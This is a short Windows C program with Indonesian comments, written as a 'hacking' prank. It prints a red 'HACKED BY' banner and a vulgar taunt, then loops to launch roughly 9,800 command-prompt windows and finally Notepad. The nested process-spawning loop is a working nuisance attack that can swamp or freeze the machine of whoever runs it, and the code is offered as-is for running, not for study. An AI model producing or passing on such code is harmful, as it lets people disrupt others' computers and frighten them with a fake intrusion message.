#include <stdio.h>
#include <windows.h> // liblary ini untuk windows 

int main(void){
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),12); // jadi warna merah biar serem hehe
	printf("[!] HACKED BY LEAFYISHERE\n");
	sleep(3);
	printf("[!] Do u want to see The Best Events???\n");
	sleep(2);
	printf("[!] check this bitch!\n");
	sleep(3);
	int x;
	for(x=1;x<3;x++){
		printf("%d",x);
		sleep(1);
	}
	int a,b;
	for(a=1;a<100;a++)
		for(b=1;b<100;b++)
			system("start cmd");
		system("start notepad");
	return 0;
}
